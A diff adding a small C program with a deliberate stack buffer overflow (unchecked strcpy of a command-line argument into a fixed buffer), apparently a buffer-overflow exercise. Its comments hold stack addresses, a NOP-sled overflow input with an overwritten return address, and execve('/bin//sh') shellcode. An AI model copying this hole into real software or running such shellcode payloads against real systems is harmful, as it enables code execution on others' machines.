@@ -1,0 +1,15 @@
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    char Buff[256];
+    strcpy(Buff, argv[1]);
+    // printf("%s\n", Buff);
+    return 0;
+}
+
+
+// 0x7fffffffdcd8
+// 0x7fffffffdbd0
+// run $(python -c 'print "\x90"*249 + "\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a" + "\x7f\xff\xff\xff\xdc\xd8"[::-1]')
+// "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
